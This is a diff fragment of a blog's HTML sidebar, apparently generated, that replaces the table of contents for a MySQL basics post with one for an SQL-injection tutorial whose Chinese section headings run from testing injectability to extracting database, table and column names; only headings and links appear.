-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL"><span class="toc-text">MYSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-text">基础使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-text">查询语句</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">SQL数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%88%A0%E9%99%A4"><span class="toc-text">数据库创建与删除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%8D%95"><span class="toc-text">创建与删除数据表单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE"><span class="toc-text">插入数据</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-INJECTION"><span class="toc-text">SQL-INJECTION</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D%E8%A6%81%E7%9F%A5%E9%81%93%E4%BB%A5%E4%B8%8B%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-text">开始之前要知道以下内容：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">如何判断是否可以注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">如何判断是什么数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BA%93%E5%90%8D"><span class="toc-text">获取库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="toc-text">获取列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-text">获取数据</span></a></li></ol></li></ol>
     </div>
 </aside>
                 
